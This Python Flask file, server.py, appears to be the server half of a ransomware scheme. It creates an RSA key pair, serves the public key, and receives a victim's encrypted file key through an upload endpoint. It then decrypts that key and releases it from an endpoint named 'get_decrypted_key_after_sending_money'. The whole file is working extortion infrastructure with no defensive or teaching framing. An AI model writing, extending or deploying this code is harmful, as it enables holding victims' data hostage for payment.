# server.py
from flask import Flask, request
from werkzeug.utils import secure_filename
import os
import random
import string
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
import requests
import csv
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from flask import Flask, send_file
import threading
import time
from typing import ByteString

app = Flask(__name__)

import os

def generate_rsa_key_pair() -> None:
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    current_dir = os.getcwd() # os.path.dirname(os.path.abspath(__file__))
    folder_name = "ServerFiles"
    private_key_path = os.path.join(current_dir, folder_name, "rsa_private_key")
    public_key_path = os.path.join(current_dir, folder_name, "rsa_public_key")
    key_pair_path = os.path.join(current_dir, folder_name, "keyPair.key")
    # Save the files
    with open(private_key_path, "wb") as f:
        f.write(private_key)
        print("rsa_private_key file was created successfully")
    with open(public_key_path, "wb") as f:
        f.write(public_key)
        print("rsa_public_key file was created successfully")
    with open(key_pair_path, "wb") as f:
        f.write(public_key + b"\n" + private_key)
        print("keyPair.key file was created successfully")

def save_to_file(content: str, file_name: str) -> None:
    with open(file_name, "w") as f:
        f.write(content)

def decrypt_encrypted_key_using_rsa_private_key(rsa_private_key, encrypted_key):
    return PKCS1_OAEP.new(RSA.import_key(rsa_private_key)).decrypt(encrypted_key)

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return 'No file part'
    file = request.files['file']
    filename = secure_filename(file.filename)
    downloads_folder = os.path.expanduser('./ServerFiles') # Get the path of the Downloads folder
    save_path = os.path.join(downloads_folder, filename) # Join the path of the Downloads folder with the filename
    file.save(save_path)
    return 'File uploaded successfully'

@app.route('/getRSAPublicKey', methods=['GET'])
def getRSAPublicKey() -> ByteString:
    current_dir = os.getcwd() # os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_dir, "ServerFiles", "rsa_public_key")
    with open(file_path, "rb") as f:
        return RSA.import_key(f.read()).export_key()

@app.route('/get_decrypted_key_after_sending_money', methods=['GET'])
def get_decrypted_key_after_sending_money():
    current_dir = os.getcwd() # os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(current_dir, "ServerFiles", "decrypted.key")
    if (os.path.isfile(file_path)):
        with open(file_path, "rb") as f:
            return f.read()

def main():
    generate_rsa_key_pair() # saved to file as keyPair.key

    current_dir = os.getcwd() # os.path.dirname(os.path.abspath(__file__))

    rsa_private_key_file_path = os.path.join(current_dir, "ServerFiles", "rsa_private_key")
    with open(rsa_private_key_file_path, "rb") as f:
        rsa_private_key = RSA.import_key(f.read()).export_key() # using generated rsa_private_key

    thread = threading.Thread(target=app.run)
    thread.start()

    # Waiting for the client to send us their public key so we can encrypt their data with it
    encrypted_key_file_path = os.path.join(current_dir, "ServerFiles", "encryptedKey.key")
    print("Waiting for encryptedKey.key to be sent from client...")
    while not os.path.isfile(encrypted_key_file_path):
        time.sleep(5)
    with open(encrypted_key_file_path, "rb") as f:
        encrypted_key = f.read()

    decrypted_key = decrypt_encrypted_key_using_rsa_private_key(rsa_private_key, encrypted_key)
    decrypted_key_file_path = os.path.join(current_dir, "ServerFiles", "decrypted.key")
    with open(decrypted_key_file_path, "wb") as f:
        f.write(decrypted_key)

if __name__ == '__main__':
    main()